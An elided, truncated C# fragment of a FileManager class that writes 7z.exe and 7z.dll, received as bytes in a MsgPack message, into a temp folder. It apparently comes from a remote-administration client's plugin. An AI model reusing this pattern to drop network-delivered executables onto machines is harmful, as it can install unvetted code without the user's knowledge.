    ...
    public class FileManager
    {
        ...
        private void CheckForSevenZip()
        {
            try
            {
                ...
                string skyshellSvenzip = Path.Combine(Path.GetTempPath(), "7-Zip", "7z.exe");
                ...
                else if (File.Exists(skyshellSvenzip))
                    Packet.ZipPath = skyshellSvenzip;
        ...
        private void InstallSevenZip(MsgPack unpack_msgpack)
        {
            try
            {
                string skyshellSvenzip = Path.Combine(Path.GetTempPath(), "7-Zip");
                if (!Directory.Exists(skyshellSvenzip))
                {
                    Directory.CreateDirectory(skyshellSvenzip);
                }

                using (FileStream fs = new FileStream(Path.Combine(skyshellSvenzip, "7z.exe"), FileMode.Create))
                    fs.Write(unpack_msgpack.ForcePathObject("exe").GetAsBytes(), 0, unpack_msgpack.ForcePathObject("exe").GetAsBytes().Length);

                using (FileStream fs = new FileStream(Path.Combine(skyshellSvenzip, "7z.dll"), FileMode.Create))
